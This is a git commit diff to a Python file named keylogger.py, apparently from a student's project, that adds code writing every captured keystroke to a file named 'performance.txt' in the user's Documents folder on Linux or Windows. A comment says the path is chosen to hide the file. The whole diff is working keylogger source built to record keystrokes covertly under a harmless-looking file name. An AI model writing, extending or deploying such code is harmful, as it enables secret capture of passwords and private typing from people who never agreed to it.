855e271012a17bba581f4a151b72c1c293300e91
kevinci-03 <kcisne04@calpoly.edu>
2023-06-09 15:43:43 -0700

    Added robusteness to keylogger

--- keylogger.py
+++ keylogger.py
@@ -1,12 +1,40 @@
 import os;
 from pynput.keyboard import Listener;
 
+FILEPATH = ""
+
 def main():
     with Listener(on_press=keyPress) as listener:
-        listener.join();
+        listener.join()
 
 def keyPress(key):
-    print(str(key));
+    print(str(key))
+    writeKey(key);
+
+def writeKey(key):
+    # We will check what OS we are on to get the path of where to hide the file
+    global FILEPATH
+    if os.name == 'posix':
+        FILEPATH = "~/Documents/performance.txt"
+        try:
+            with open(FILEPATH, "a") as keyFile:
+                keyFile.write(str(key))
+        except IOError as e:
+            exit(1)
+    elif os.name == 'nt':
+        print("Running on a Windows System")
+        username = os.getlogin()
+        FILEPATH = f"C:\\Users\\{username}\\Documents\\performance.txt"
+        try:
+            with open(FILEPATH, "a") as keyFile:
+                keyFile.write(str(key))
+        except IOError as e:
+            print("Error writing to file:", e)
+            exit(1)
+    else:
+        print("System is unknown");
+        exit(1);
+        
 
 if __name__ == "__main__":
     main()
